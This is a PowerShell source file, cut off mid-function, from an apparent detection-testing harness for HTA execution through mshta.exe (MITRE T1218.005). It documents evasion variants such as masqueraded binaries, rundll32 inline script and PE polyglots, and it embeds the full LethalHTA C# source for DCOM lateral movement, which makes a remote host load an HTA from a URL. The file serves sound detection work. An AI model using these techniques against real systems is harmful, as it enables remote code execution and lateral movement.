function ConvertTo-EncodedWSHScript {
<#
.SYNOPSIS

Encodes VBScript or JScript code.

.DESCRIPTION

ConvertTo-EncodedWSHScript encodes VBScript or JScript code which can then be executed with the respective, VBScript.Encode and JScript.Encode engines. ConvertTo-EncodedWSHScript uses the Scripting.Encoder EncodeScriptFile COM method to perform the encoding.

.PARAMETER ScriptContent

Specifies the Windows Script Host code to encode. It can be VBScript or JScript code.

.OUTPUTS

System.String

Outputs the script content in its encoded form.

.EXAMPLE

ConvertTo-EncodedWSHScript -ScriptContent @'
var objShell = new ActiveXObject('Wscript.Shell');
objShell.Run("powershell.exe -nop -Command Start-Sleep -Seconds 2; exit", 0, true);
window.close();
'@
#>

    [CmdletBinding()]
    [OutputType([String])]
    param (
        [String]
        [ValidateNotNullOrEmpty()]
        $ScriptContent
    )

    $Encoder = New-Object -ComObject 'Scripting.Encoder'

    # The '.vbs' extension and 'VBScript' engine don't matter. The encoder doesn't
    # have different logic for JScript vs. VBScript
    $EncodedScriptContent = $Encoder.EncodeScriptFile('.vbs', $ScriptContent, 0, 'VBScript')

    # Return the encoded script string.
    $EncodedScriptContent.TrimEnd(([Char] 0))
}


function Invoke-ATHHTMLApplication {
<#
.SYNOPSIS

Test runner for HTML Applications (HTA) for the purposes of validating detection coverage.

Technique ID: T1218.005 (Signed Binary Proxy Execution: Mshta)

.DESCRIPTION

Invoke-ATHHTMLApplication executes HTA script content using as many known variations as possible for the purposes of validating detection coverage.

.PARAMETER HTAFilePath

Specifies the file path where the HTA content will be saved. HTA files can have any file extension. If -HTAFilePath is not specified, it will be saved to Test.hta in current directory.

Note: Naming your HTA file with a .txt extension will cause it to not execute.

.PARAMETER HTAUri

Specifies the URI where the HTA content will be downloaded from. Because Invoke-ATHHTMLApplication has no control over the specified URI, it is unable to determine if the HTA content successfully executed.

Note: mshta.exe will not execute downloaded script content if the hosting mime type is "text/plain". Based on our understanding, it will execute any mime type as long as it's not "text/plain". For example, the specified mime type need not be "application/hta".

.PARAMETER ScriptContent

By default, Invoke-ATHHTMLApplication uses a default template HTA script which launches a unique powershell.exe child process. To overrride this behavior and execute your own WSH script code (VBScript, JScript, etc.), you can supply raw script code via the -ScriptContent parameter. Because Invoke-ATHHTMLApplication has no control over the specified script content, it is unable to determine if the HTA content successfully executed.

.PARAMETER ScriptEngine

Specifies the WSH scripting engine to use. The following options are supported: JScript, VBScript, VBScript.Encode, JScript.Encode, JScript.Compact. These options are supported when an HTA file on disk is executed.

.PARAMETER InlineProtocolHandler

Specifies the protocol handler to use when executed inline on the commandline. "JavaScript", "VBScript", and "About" are the only supported options when invoking HTA content directly on the commandline.

.PARAMETER TemplatePE

Appends HTA script content to the end of a PE file and executes it. It was shown in this blog post that HTA content can be embedded in many different file format including the PE file format: http://blog.sevagas.com/?Hacking-around-HTA-files.

Supplying this switch will append the HTA script content to cmd.exe and copy it to cmd_with_hta.exe in the current directory. While other file formats are supported, we felt just covering a single file type (PE files) was sufficient to measure detection coverage.

.PARAMETER AsLocalUNCPath

Specifies that the HTA file should execute as a local UNC path. No attempt is made to establish an actual file share. Instead, UNC file syntax is used to execute a local file.

.PARAMETER SimulateLateralMovement

Executes an HTA locally using the DCOM-based lateral movement technique highlighted in this blog post: https://codewhitesec.blogspot.com/2018/07/lethalhta.html

The code used to execute this technique was taken from their GitHub repo: https://github.com/codewhitesec/LethalHTA/tree/master/DotNet

.PARAMETER SimulateUserDoubleClick

Specifies that a double click of an HTA file should be simulated. This is accomplished by launching the HTA file with explorer.exe.

.PARAMETER MSHTAFilePath

Specifies an alternate directory to execute mshta.exe from. if -MSHTAFilePath is not supplied, mshta.exe will execute from %windir%\System32.

.PARAMETER UseRundll32

Specifies that rundll32.exe will be used to execute inline HTA script code instead of mshta.exe.

.PARAMETER Rundll32FilePath

Optionally specify and alternative file path/name to rundll32.exe. You will need to first copy rundll32.exe to the specified location. if -Rundll32FilePath is not supplied, rundll32.exe will execute from %windir%\System32.

.PARAMETER TestGuid

Optionally, specify a test GUID value to use to override the generated test GUID behavior.

.OUTPUTS

PSObject

Outputs an object consisting of relevant execution details. The following object properties may be populated:

* TechniqueID - Specifies the relevant MITRE ATT&CK Technique ID.
* TestSuccess - Will be set to True if it was determined that the HTA script content successfully executed. This will not be set to True if -ScriptContent was supplied or if the HTA content failed to execute.
* TestGuid - Specifies the test GUID that was used for the test. This property will not be populated when -HTAUri or -ScriptContent is specified.
* ExecutionType - Indicates how the HTA was executed: File, InlineMshta, InlineRundll32
* ScriptEngine - Indicates the Windows Script Host script engine that launched the HTA script content: JScript, VBScript, JScript.Encode, VBScript.Encode, or JScript.Compact
* HTAFilePath - Specifies the path to the HTA file (or polyglot) that was dropped, if relevant. Inline HTA execution will not drop and HTA file so this property will be null.
* HTAFileHashSHA256 - Specifies the file hash of the dropped HTA content.
* RunnerFilePath - Specifies the full path of mshta or rundll32 runner.
* RunnerProcessId - Specifies the process ID of mshta or rundll32 runner.
* RunnerCommandLine - Specifies the commandline of mshta or rundll32 runner.
* RunnerChildProcessId - Specifies the process ID of process that was executed as the result of the HTA content executing. This property will not be populated if user-supplied script content is supplied via -ScriptContent.
* RunnerChildProcessCommandLine - Specifies the commandline of process that was executed as the result of the HTA content executing. This property will not be populated if user-supplied script content is supplied via -ScriptContent.

.EXAMPLE

Invoke-ATHHTMLApplication

Executes template HTA script code using all default configurations.

.EXAMPLE

Invoke-ATHHTMLApplication -HTAFilePath badstuff.csv -ScriptEngine JScript.Encode

Executes encoded JSCript content from badstuff.csv.

.EXAMPLE

Invoke-ATHHTMLApplication -ScriptEngine VBScript -SimulateLateralMovement

Executes an HTA locally using the LethalHTA lateral movement technique.

.EXAMPLE

Invoke-ATHHTMLApplication -HTAUri https://www.benign.ca/hello.hta

.EXAMPLE

Copy-Item -Path C:\Windows\System32\mshta.exe -Destination C:\Test\notepad.exe
Invoke-ATHHTMLApplication -HTAUri https://www.benign.ca/hello.hta -MSHTAFilePath C:\Test\notepad.exe

.EXAMPLE

Invoke-ATHHTMLApplication -TemplatePE

Executes HTA script content from a polyglot PE file.

.EXAMPLE

Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath

Executes an HTA locally as a UNC path using the LethalHTA lateral movement technique.

.EXAMPLE

Copy-Item C:\Windows\System32\mshta.exe C:\Temp\notepad.exe
Invoke-ATHHTMLApplication -InlineProtocolHandler JavaScript -MSHTAFilePath C:\Temp\notepad.exe

Executes inline HTA JavaScript content using a masqueraded mshta.exe process.

.EXAMPLE

Invoke-ATHHTMLApplication -InlineProtocolHandler VBScript -UseRundll32

Executes inline HTA VBScript content with rundll32.exe.

.EXAMPLE

Invoke-ATHHTMLApplication -InlineProtocolHandler About

Executes inline HTA content using the "about" protocol handler.

.EXAMPLE

Invoke-ATHHTMLApplication -SimulateUserDoubleClick

Executes an HTA file as if a user had double-clicked on it.
#>

    [CmdletBinding(DefaultParameterSetName = 'FileBased')]
    param (
        [Parameter(ParameterSetName = 'FileBased')]
        [Parameter(ParameterSetName = 'DoubleClick')]
        [String]
        [ValidateNotNullOrEmpty()]
        $HTAFilePath = 'Test.hta',

        [Parameter(Mandatory, ParameterSetName = 'Uri')]
        [String]
        [ValidateNotNullOrEmpty()]
        $HTAUri,

        [Parameter(ParameterSetName = 'FileBased')]
        [Parameter(ParameterSetName = 'DoubleClick')]
        [String]
        [ValidateNotNullOrEmpty()]
        $ScriptContent,

        [Parameter(ParameterSetName = 'FileBased')]
        [Parameter(ParameterSetName = 'DoubleClick')]
        [Parameter(ParameterSetName = 'Inline')]
        [Parameter(ParameterSetName = 'Rundll32Inline')]
        [String]
        [ValidateSet('JScript', 'VBScript', 'VBScript.Encode', 'JScript.Encode', 'JScript.Compact')]
        $ScriptEngine = 'JScript',

        [Parameter(Mandatory, ParameterSetName = 'PolyglotFile')]
        [Switch]
        $TemplatePE,

        [Parameter(ParameterSetName = 'FileBased')]
        [Parameter(ParameterSetName = 'PolyglotFile')]
        [Switch]
        $AsLocalUNCPath,

        [Parameter(ParameterSetName = 'FileBased')]
        [Switch]
        $SimulateLateralMovement,

        [Parameter(Mandatory, ParameterSetName = 'DoubleClick')]
        [Switch]
        $SimulateUserDoubleClick,

        [Parameter(ParameterSetName = 'Inline')]
        [Parameter(ParameterSetName = 'Rundll32Inline')]
        [String]
        [ValidateSet('JavaScript', 'VBScript', 'About')]
        $InlineProtocolHandler = 'JavaScript',

        [Parameter(ParameterSetName = 'FileBased')]
        [Parameter(ParameterSetName = 'Uri')]
        [Parameter(ParameterSetName = 'PolyglotFile')]
        [Parameter(ParameterSetName = 'Inline')]
        [String]
        [ValidateNotNullOrEmpty()]
        $MSHTAFilePath = "$Env:windir\System32\mshta.exe",

        [Parameter(Mandatory, ParameterSetName = 'Rundll32Inline')]
        [Switch]
        $UseRundll32,

        [Parameter(ParameterSetName = 'Rundll32Inline')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Rundll32FilePath = "$Env:windir\System32\rundll32.exe",

        [Guid]
        $TestGuid = (New-Guid)
    )

    $HTAScriptExecuted = $null
    $FullHTAPath = $null
    $HTAFileHashSHA256 = $null
    $MSHTAProcessId = $null
    $ProcessWMICommandLine = $null
    $SpawnedProcCommandLine = $null
    $SpawnedProcProcessId = $null
    $ParentProcessPath = $null
    $TestGuidToUse = $null
    $ChildProcCommand = "powershell.exe -nop -Command Write-Host $TestGuid; Start-Sleep -Seconds 2; exit"
    $ChildProcCommandHTMLEncoded = $ChildProcCommand.Replace(' ', '%20')

    # Source code compiled from the LethalHTA project: https://github.com/codewhitesec/LethalHTA/tree/master/DotNet/LethalHTADotNet
    <#
    MIT License

    Copyright (c) 2018 Code White GmbH

    Permission is hereby granted, free of charge, to any person obtaining a copy
    of this software and associated documentation files (the "Software"), to deal
    in the Software without restriction, including without limitation the rights
    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
    copies of the Software, and to permit persons to whom the Software is
    furnished to do so, subject to the following conditions:

    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
    SOFTWARE.
    #>
    $LethalHTASource = @'
    using System;
    using System.Runtime.CompilerServices;
    using System.Runtime.InteropServices;
    using System.Runtime.InteropServices.ComTypes;

    namespace LethalHTADotNet
    {
        public static class ComUtils
        {
            public static IntPtr IID_IUnknownPtr = GuidToPointer("00000000-0000-0000-C000-000000000046");

            public static IntPtr GuidToPointer(string guid)
            {
                Guid g = new Guid(guid);

                IntPtr ret = System.Runtime.InteropServices.Marshal.AllocCoTaskMem(16);
                System.Runtime.InteropServices.Marshal.Copy(g.ToByteArray(), 0, ret, 16);

                return ret;
            }

            [Flags]
            public enum CLSCTX : uint
            {
                CLSCTX_INPROC_SERVER = 0x1,
                CLSCTX_INPROC_HANDLER = 0x2,
                CLSCTX_LOCAL_SERVER = 0x4,
                CLSCTX_INPROC_SERVER16 = 0x8,
                CLSCTX_REMOTE_SERVER = 0x10,
                CLSCTX_INPROC_HANDLER16 = 0x20,
                CLSCTX_RESERVED1 = 0x40,
                CLSCTX_RESERVED2 = 0x80,
                CLSCTX_RESERVED3 = 0x100,
                CLSCTX_RESERVED4 = 0x200,
                CLSCTX_NO_CODE_DOWNLOAD = 0x400,
                CLSCTX_RESERVED5 = 0x800,
                CLSCTX_NO_CUSTOM_MARSHAL = 0x1000,
                CLSCTX_ENABLE_CODE_DOWNLOAD = 0x2000,
                CLSCTX_NO_FAILURE_LOG = 0x4000,
                CLSCTX_DISABLE_AAA = 0x8000,
                CLSCTX_ENABLE_AAA = 0x10000,
                CLSCTX_FROM_DEFAULT_CONTEXT = 0x20000,
                CLSCTX_ACTIVATE_32_BIT_SERVER = 0x40000,
                CLSCTX_ACTIVATE_64_BIT_SERVER = 0x80000,
                CLSCTX_INPROC = CLSCTX_INPROC_SERVER | CLSCTX_INPROC_HANDLER,
                CLSCTX_SERVER = CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_REMOTE_SERVER,
                CLSCTX_ALL = CLSCTX_SERVER | CLSCTX_INPROC_HANDLER
            }

            [System.Runtime.InteropServices.DllImport("urlmon.dll")]
            public static extern int CreateURLMonikerEx(
                    IntPtr punk,
                    [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)] string pszDisplayName,
                    out IMoniker ppmk,
                    uint flags
                );

            [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
            public struct MULTI_QI
            {
                public IntPtr pIID;
                [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Interface)]
                public object pItf;
                public int hr;
            }

            [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
            public class COSERVERINFO
            {
                public uint dwReserved1;
                [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]
                public string pwszName;
                public IntPtr pAuthInfo;
                public uint dwReserved2;
            }

            [System.Runtime.InteropServices.DllImport("ole32.dll")]
            public static extern void CoCreateInstanceEx(
                [System.Runtime.InteropServices.In, System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPStruct)] Guid rclsid,
                [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.IUnknown)] object pUnkOuter,
                CLSCTX dwClsCtx,
                COSERVERINFO pServerInfo,
                uint cmq,
                [System.Runtime.InteropServices.In, System.Runtime.InteropServices.Out] MULTI_QI[] pResults);
        }

        public struct FILETIME
        {   
            public int dwLowDateTime;
            public int dwHighDateTime;
        }

        public struct ULARGE_INTEGER
        {
            public ulong QuadPart;
        }

        [ComImport]
        [Guid("0000010C-0000-0000-C000-000000000046")]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        public interface IPersist
        {
            [MethodImpl(MethodImplOptions.PreserveSig | MethodImplOptions.InternalCall)]
            int GetClassID(out Guid pClassID);
        }

        [ComImport]
        [Guid("00000109-0000-0000-C000-000000000046")]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        public interface IPersistStream : IPersist
        {
            [MethodImpl(MethodImplOptions.PreserveSig | MethodImplOptions.InternalCall)]
            new int GetClassID(out Guid pClassID);

            [MethodImpl(MethodImplOptions.PreserveSig | MethodImplOptions.InternalCall)]
            int IsDirty();

            [MethodImpl(MethodImplOptions.InternalCall)]
            void Load([In] [MarshalAs(UnmanagedType.Interface)] IStream pstm);

            [MethodImpl(MethodImplOptions.InternalCall)]
            void Save([In] [MarshalAs(UnmanagedType.Interface)] IStream pstm, [In]  int fClearDirty);

            [MethodImpl(MethodImplOptions.InternalCall)]
            void GetSizeMax([Out]  [MarshalAs(UnmanagedType.LPArray)] ULARGE_INTEGER[] pcbSize);
        }

        [ComImport]
        [Guid("0000000F-0000-0000-C000-000000000046")]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]  
        public interface IMoniker : IPersistStream
        {
            [MethodImpl(MethodImplOptions.PreserveSig | MethodImplOptions.InternalCall)]
            new int GetClassID(out Guid pClassID);

            [MethodImpl(MethodImplOptions.PreserveSig | MethodImplOptions.InternalCall)]
            new int IsDirty();

            [MethodImpl(MethodImplOptions.InternalCall)]
            new void Load([In] [MarshalAs(UnmanagedType.Interface)] IStream pstm);

            [MethodImpl(MethodImplOptions.InternalCall)]
            new void Save([In] [MarshalAs(UnmanagedType.Interface)] IStream pstm, [In]  int fClearDirty);

            [MethodImpl(MethodImplOptions.InternalCall)]
            new void GetSizeMax([Out]  [MarshalAs(UnmanagedType.LPArray)] ULARGE_INTEGER[] pcbSize);

            [MethodImpl(MethodImplOptions.InternalCall)]
            void BindToObject([In] [MarshalAs(UnmanagedType.Interface)] IBindCtx pbc, [In] [MarshalAs(UnmanagedType.Interface)] IMoniker pmkToLeft, [In]  ref Guid riidResult, [MarshalAs(UnmanagedType.IUnknown)] out object ppvResult);

            [MethodImpl(MethodImplOptions.InternalCall)]
            void BindToStorage([In] [MarshalAs(UnmanagedType.Interface)] IBindCtx pbc, [In] [MarshalAs(UnmanagedType.Interface)] IMoniker pmkToLeft, [In]  ref Guid riid, [MarshalAs(UnmanagedType.IUnknown)] out object ppvObj);

            [MethodImpl(MethodImplOptions.InternalCall)]
            void Reduce([In] [MarshalAs(UnmanagedType.Interface)] IBindCtx pbc, [In]  uint dwReduceHowFar, [In] [Out] [MarshalAs(UnmanagedType.Interface)] ref IMoniker ppmkToLeft, [MarshalAs(UnmanagedType.Interface)] out IMoniker ppmkReduced);

            [MethodImpl(MethodImplOptions.InternalCall)]
            void ComposeWith([In] [MarshalAs(UnmanagedType.Interface)] IMoniker pmkRight, [In]  int fOnlyIfNotGeneric, [MarshalAs(UnmanagedType.Interface)] out IMoniker ppmkComposite);

            [MethodImpl(MethodImplOptions.InternalCall)]
            void Enum([In]  int fForward, [MarshalAs(UnmanagedType.Interface)] out IEnumMoniker ppenumMoniker);

            [MethodImpl(MethodImplOptions.InternalCall)]
            void IsEqual([In] [MarshalAs(UnmanagedType.Interface)] IMoniker pmkOtherMoniker);

            [MethodImpl(MethodImplOptions.InternalCall)]
            void Hash( out uint pdwHash);

            [MethodImpl(MethodImplOptions.PreserveSig | MethodImplOptions.InternalCall)]
            int IsRunning([In] [MarshalAs(UnmanagedType.Interface)] IBindCtx pbc, [In] [MarshalAs(UnmanagedType.Interface)] IMoniker pmkToLeft, [In] [MarshalAs(UnmanagedType.Interface)] IMoniker pmkNewlyRunning);

            [MethodImpl(MethodImplOptions.InternalCall)]
            void GetTimeOfLastChange([In] [MarshalAs(UnmanagedType.Interface)] IBindCtx pbc, [In] [MarshalAs(UnmanagedType.Interface)] IMoniker pmkToLeft, [Out]  [MarshalAs(UnmanagedType.LPArray)] FILETIME[] pFileTime);

            [MethodImpl(MethodImplOptions.InternalCall)]
            void Inverse([MarshalAs(UnmanagedType.Interface)] out IMoniker ppmk);

            [MethodImpl(MethodImplOptions.InternalCall)]
            void CommonPrefixWith([In] [MarshalAs(UnmanagedType.Interface)] IMoniker pmkOther, [MarshalAs(UnmanagedType.Interface)] out IMoniker ppmkPrefix);

            [MethodImpl(MethodImplOptions.InternalCall)]
            void RelativePathTo([In] [MarshalAs(UnmanagedType.Interface)] IMoniker pmkOther, [MarshalAs(UnmanagedType.Interface)] out IMoniker ppmkRelPath);

            [MethodImpl(MethodImplOptions.InternalCall)]
            void GetDisplayName([In] [MarshalAs(UnmanagedType.Interface)] IBindCtx pbc, [In] [MarshalAs(UnmanagedType.Interface)] IMoniker pmkToLeft,  [MarshalAs(UnmanagedType.LPWStr)] out string ppszDisplayName);

            [MethodImpl(MethodImplOptions.InternalCall)]
            void ParseDisplayName([In] [MarshalAs(UnmanagedType.Interface)] IBindCtx pbc, [In] [MarshalAs(UnmanagedType.Interface)] IMoniker pmkToLeft, [In]  [MarshalAs(UnmanagedType.LPWStr)] string pszDisplayName,  out uint pchEaten, [MarshalAs(UnmanagedType.Interface)] out IMoniker ppmkOut);

            [MethodImpl(MethodImplOptions.InternalCall)]
            void IsSystemMoniker( out uint pdwMksys);
        }

        [ComImport]
        [Guid("00000003-0000-0000-C000-000000000046")]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        [ComConversionLoss]
        public interface IMarshal
        {
            [MethodImpl(MethodImplOptions.InternalCall)]
            void GetUnmarshalClass([In]  ref Guid riid, [In] IntPtr pv, [In]  uint dwDestContext, [In] IntPtr pvDestContext, [In]  uint MSHLFLAGS, out Guid pCid);

            [MethodImpl(MethodImplOptions.InternalCall)]
            void GetMarshalSizeMax([In]  ref Guid riid, [In] IntPtr pv, [In]  uint dwDestContext, [In] IntPtr pvDestContext, [In]  uint MSHLFLAGS,  out uint pSize);

            [MethodImpl(MethodImplOptions.InternalCall)]
            void MarshalInterface([In] [MarshalAs(UnmanagedType.Interface)] IStream pstm, [In]  ref Guid riid, [In] IntPtr pv, [In]  uint dwDestContext, [In] IntPtr pvDestContext, [In]  uint MSHLFLAGS);

            [MethodImpl(MethodImplOptions.InternalCall)]
            void UnmarshalInterface([In] [MarshalAs(UnmanagedType.Interface)] IStream pstm, [In]  ref Guid riid, out IntPtr ppv);

            [MethodImpl(MethodImplOptions.InternalCall)]
            void ReleaseMarshalData([In] [MarshalAs(UnmanagedType.Interface)] IStream pstm);

            [MethodImpl(MethodImplOptions.InternalCall)]
            void DisconnectObject([In]  uint dwReserved);
        }

        [Guid("79EAC9C9-BAF9-11CE-8C82-00AA004BA90B")]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IPersistMoniker
        {
            void GetClassID(out Guid p0);
            void IsDirty();
            void Load(uint fFullyAvailable, LethalHTADotNet.IMoniker pimkName, IBindCtx pibc, uint grfMode);
            void Save(LethalHTADotNet.IMoniker pimkName, IBindCtx pbc, uint fRemember);
            void SaveCompleted(LethalHTADotNet.IMoniker pimkName, IBindCtx pibc);
            void GetCurMoniker(out LethalHTADotNet.IMoniker ppimkName);
        }

        [ComVisible(true)]
        class FakeObject : IMarshal, IMoniker
        {
            private IMarshal _marshal;

            public FakeObject(IMoniker moniker)
            {
                this._marshal = (IMarshal)moniker;
            }

            public void GetUnmarshalClass([In] ref Guid riid, [In] IntPtr pv, [In] uint dwDestContext, [In] IntPtr pvDestContext, [In] uint MSHLFLAGS, out Guid pCid)
            {
                _marshal.GetUnmarshalClass(riid, pv, 1, pvDestContext, MSHLFLAGS, out pCid);
            }

            public void GetMarshalSizeMax([In] ref Guid riid, [In] IntPtr pv, [In] uint dwDestContext, [In] IntPtr pvDestContext, [In] uint MSHLFLAGS, out uint pSize)
            {
                _marshal.GetMarshalSizeMax(riid, pv, 1, pvDestContext, MSHLFLAGS, out pSize);
            }

            public void MarshalInterface([In, MarshalAs(UnmanagedType.Interface)] System.Runtime.InteropServices.ComTypes.IStream pstm, [In] ref Guid riid, [In] IntPtr pv, [In] uint dwDestContext, [In] IntPtr pvDestContext, [In] uint MSHLFLAGS)
            {
                _marshal.MarshalInterface(pstm, riid, pv, 1, pvDestContext, MSHLFLAGS);
            }

            public void UnmarshalInterface([In, MarshalAs(UnmanagedType.Interface)] System.Runtime.InteropServices.ComTypes.IStream pstm, [In] ref Guid riid, out IntPtr ppv)
            {
                _marshal.UnmarshalInterface(pstm, ref riid, out ppv);
            }

            public void ReleaseMarshalData([In, MarshalAs(UnmanagedType.Interface)] System.Runtime.InteropServices.ComTypes.IStream pstm)
            {
                _marshal.ReleaseMarshalData(pstm);
            }

            public void DisconnectObject([In] uint dwReserved)
            {
                _marshal.DisconnectObject(dwReserved);
            }


            public int GetClassID(out Guid pClassID)
            {
                throw new NotImplementedException();
            }

            public int IsDirty()
            {
                throw new NotImplementedException();
            }

            public void Load([In, MarshalAs(UnmanagedType.Interface)] System.Runtime.InteropServices.ComTypes.IStream pstm)
            {
                throw new NotImplementedException();
            }

            public void Save([In, MarshalAs(UnmanagedType.Interface)] System.Runtime.InteropServices.ComTypes.IStream pstm, [In] int fClearDirty)
            {
                throw new NotImplementedException();
            }

            public void GetSizeMax([MarshalAs(UnmanagedType.LPArray), Out] ULARGE_INTEGER[] pcbSize)
            {
                throw new NotImplementedException();
            }

            public void BindToObject([In, MarshalAs(UnmanagedType.Interface)] System.Runtime.InteropServices.ComTypes.IBindCtx pbc, [In, MarshalAs(UnmanagedType.Interface)] IMoniker pmkToLeft, [In] ref Guid riidResult, [MarshalAs(UnmanagedType.IUnknown)] out object ppvResult)
            {
                throw new NotImplementedException();
            }

            public void BindToStorage([In, MarshalAs(UnmanagedType.Interface)] System.Runtime.InteropServices.ComTypes.IBindCtx pbc, [In, MarshalAs(UnmanagedType.Interface)] IMoniker pmkToLeft, [In] ref Guid riid, [MarshalAs(UnmanagedType.IUnknown)] out object ppvObj)
            {
                throw new NotImplementedException();
            }

            public void Reduce([In, MarshalAs(UnmanagedType.Interface)] System.Runtime.InteropServices.ComTypes.IBindCtx pbc, [In] uint dwReduceHowFar, [In, MarshalAs(UnmanagedType.Interface), Out] ref IMoniker ppmkToLeft, [MarshalAs(UnmanagedType.Interface)] out IMoniker ppmkReduced)
            {
                throw new NotImplementedException();
            }

            public void ComposeWith([In, MarshalAs(UnmanagedType.Interface)] IMoniker pmkRight, [In] int fOnlyIfNotGeneric, [MarshalAs(UnmanagedType.Interface)] out IMoniker ppmkComposite)
            {
                throw new NotImplementedException();
            }

            public void Enum([In] int fForward, [MarshalAs(UnmanagedType.Interface)] out System.Runtime.InteropServices.ComTypes.IEnumMoniker ppenumMoniker)
            {
                throw new NotImplementedException();
            }

            public void IsEqual([In, MarshalAs(UnmanagedType.Interface)] IMoniker pmkOtherMoniker)
            {
                throw new NotImplementedException();
            }

            public void Hash(out uint pdwHash)
            {
                throw new NotImplementedException();
            }

            public int IsRunning([In, MarshalAs(UnmanagedType.Interface)] System.Runtime.InteropServices.ComTypes.IBindCtx pbc, [In, MarshalAs(UnmanagedType.Interface)] IMoniker pmkToLeft, [In, MarshalAs(UnmanagedType.Interface)] IMoniker pmkNewlyRunning)
            {
                throw new NotImplementedException();
            }

            public void GetTimeOfLastChange([In, MarshalAs(UnmanagedType.Interface)] System.Runtime.InteropServices.ComTypes.IBindCtx pbc, [In, MarshalAs(UnmanagedType.Interface)] IMoniker pmkToLeft, [MarshalAs(UnmanagedType.LPArray), Out] FILETIME[] pFileTime)
            {
                throw new NotImplementedException();
            }

            public void Inverse([MarshalAs(UnmanagedType.Interface)] out IMoniker ppmk)
            {
                throw new NotImplementedException();
            }

            public void CommonPrefixWith([In, MarshalAs(UnmanagedType.Interface)] IMoniker pmkOther, [MarshalAs(UnmanagedType.Interface)] out IMoniker ppmkPrefix)
            {
                throw new NotImplementedException();
            }

            public void RelativePathTo([In, MarshalAs(UnmanagedType.Interface)] IMoniker pmkOther, [MarshalAs(UnmanagedType.Interface)] out IMoniker ppmkRelPath)
            {
                throw new NotImplementedException();
            }

            public void GetDisplayName([In, MarshalAs(UnmanagedType.Interface)] System.Runtime.InteropServices.ComTypes.IBindCtx pbc, [In, MarshalAs(UnmanagedType.Interface)] IMoniker pmkToLeft, [MarshalAs(UnmanagedType.LPWStr)] out string ppszDisplayName)
            {
                throw new NotImplementedException();
            }

            public void ParseDisplayName([In, MarshalAs(UnmanagedType.Interface)] System.Runtime.InteropServices.ComTypes.IBindCtx pbc, [In, MarshalAs(UnmanagedType.Interface)] IMoniker pmkToLeft, [In, MarshalAs(UnmanagedType.LPWStr)] string pszDisplayName, out uint pchEaten, [MarshalAs(UnmanagedType.Interface)] out IMoniker ppmkOut)
            {
                throw new NotImplementedException();
            }

            public void IsSystemMoniker(out uint pdwMksys)
            {
                throw new NotImplementedException();
            }


        }

        public class LethalHTA
        {
            static Guid iUnknown = new Guid("00000000-0000-0000-C000-000000000046");
            static Guid htafile = new Guid("3050F4D8-98B5-11CF-BB82-00AA00BDCE0B");

            public void pwn(string target, string htaUrl)
            {
                try
                {
                    IMoniker moniker;
                    ComUtils.CreateURLMonikerEx(IntPtr.Zero, htaUrl, out moniker, 0);

                    ComUtils.MULTI_QI[] mqi = new ComUtils.MULTI_QI[1];
                    mqi[0].pIID = ComUtils.IID_IUnknownPtr;

                    ComUtils.COSERVERINFO info = new ComUtils.COSERVERINFO();
                    info.pwszName = target;
                    info.dwReserved1 = 0;
                    info.dwReserved2 = 0;
                    info.pAuthInfo = IntPtr.Zero;

                    ComUtils.CoCreateInstanceEx(htafile, null, ComUtils.CLSCTX.CLSCTX_REMOTE_SERVER, info, 1, mqi);
                    if (mqi[0].hr != 0)
                    {
                        Console.WriteLine("Creating htafile COM object failed on target");
                        return;
                    }

                    IPersistMoniker iPersMon = (IPersistMoniker)mqi[0].pItf;
                    FakeObject fake = new FakeObject(moniker);
                    iPersMon.Load(0, fake, null, 0);
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception:  " + e);
                }
            }


            public static void Main(string[] args)
            {

                if (args.Length != 2)
                {
                    Console.WriteLine("LethalHTADotNet.exe target url/to/hta");
                    return;
                }
                LethalHTA hta = new LethalHTA();
                hta.pwn(args[0], args[1]);
            
            }
        }
    }
'@

    Add-Type -TypeDefinition $LethalHTASource

    if ($PSCmdlet.ParameterSetName -eq 'Rundll32Inline') {
        $MSHTAFullPath = Resolve-Path -Path $Rundll32FilePath -ErrorAction Stop

        # Validate that the MSHTA supplied is actually MSHTA.
        $MSHTAFileInfo = Get-Item -Path $MSHTAFullPath -ErrorAction Stop

        if ($MSHTAFileInfo.VersionInfo.InternalName -ne 'rundll') {
            Write-Error "The rundll32 executable supplied is not rundll32.exe: $MSHTAFullPath"

            return
        }
    } else {
        $MSHTAFullPath = Resolve-Path -Path $MSHTAFilePath -ErrorAction Stop

        # Validate that the MSHTA supplied is actually MSHTA.
        $MSHTAFileInfo = Get-Item -Path $MSHTAFullPath -ErrorAction Stop

        if ($MSHTAFileInfo.VersionInfo.InternalName -ne 'MSHTA.EXE') {
            Write-Error "The MSHTA executable supplied is not mshta.exe: $MSHTAFullPath"

            return
        }
    }
    

    $MSHTADirectory = Split-Path -Path $MSHTAFullPath -Parent

    if ($MSHTADirectory -eq $PWD) {
